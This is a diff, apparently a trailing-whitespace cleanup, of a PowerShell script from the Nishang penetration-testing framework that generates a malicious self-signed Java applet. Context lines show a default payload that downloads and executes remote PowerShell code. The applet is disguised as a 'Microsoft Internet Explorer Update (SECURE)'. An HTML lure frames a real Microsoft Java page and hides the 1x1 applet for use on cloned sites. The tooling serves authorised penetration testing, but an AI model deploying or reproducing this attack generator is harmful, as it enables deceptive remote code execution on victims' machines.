@@ -17,7 +17,7 @@ So you need to pass only the 32 bit shellcode to it. In case you would like to u
 condition marked in the source of Java code being generated.
 
 The script needs JDK to be installed on the attacker's machine. The parameters passed to keytool and jarsigner
-could be changed in the source for further customization. Those are not asked as function parameters to keep the 
+could be changed in the source for further customization. Those are not asked as function parameters to keep the
 number of parameters less for easy usage.
 
 .PARAMETER Payload
@@ -72,16 +72,16 @@ https://github.com/samratashok/nishang
 
 
     [CmdletBinding()] Param(
-        
+
         [Parameter(Position = 0, Mandatory = $False)]
         [String]
         $Payload,
-        
+
         [Parameter(Position = 1, Mandatory = $False)]
         [String]
         $PayloadURL,
 
-        
+
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
         $Arguments,
@@ -104,7 +104,7 @@ https://github.com/samratashok/nishang
     if(!$Payload)
     {
         $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
-    }    
+    }
 
 #Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
     $JavaClass = @"
@@ -154,7 +154,7 @@ Application-Name: Microsoft Internet Explorer Update (SECURE)
     #Create the JAR
     $Jarpath = "$JDKPath" + "\bin\jar.exe"
     & "$JarPath" "-cvfm" "$OutputPath\JavaPS.jar" "$ManifestFile" "JavaPS.class"
-    
+
     #Parameters passed to keytool and jarsigner. You may change these to your choice.
     $KeystoreAlias = "SignApplet"
     $KeyStore = "PSKeystore"
@@ -172,17 +172,17 @@ Application-Name: Microsoft Internet Explorer Update (SECURE)
         #Self sign the JAR
         $JarSignerPath = "$JDKPath" + "\bin\jarsigner.exe"
         & "$JarSignerPath" "-keystore" "$KeyStore" "-storepass" "$StorePass" "-keypass" "$KeyPass" "-signedjar" "$OutputPath\SignedJavaPS.jar" "$OutputPath\JavaPS.jar" "SignApplet"
-    
+
         #Output simple html. This could be used with any cloned web page.
         #Host this HTML and SignedJarPS.jar on a web server.
         $HTMLCode = @'
-        <div> 
+        <div>
     <object type="text/html" data="http://windows.microsoft.com/en-IN/internet-explorer/install-java" width="100%" height="100%">
     </object></div>
     <applet code="JavaPS" width="1" height="1" archive="SignedJavaPS.jar" > </applet>'
 '@
         $HTMLFile = "$OutputPath\applet.html"
-        Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   
+        Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
 
         #Cleanup
         Remove-Item "$OutputPath\PSKeyStore"
@@ -194,7 +194,7 @@ Application-Name: Microsoft Internet Explorer Update (SECURE)
         #Cleanup
         Remove-Item "$OutputPath\JavaPS.java"
         Remove-Item "$OutputPath\JavaPS.class"
-    }    
+    }
     #Cleanup to remove temporary files
     Remove-Item "$OutputPath\manifest.txt"
 }
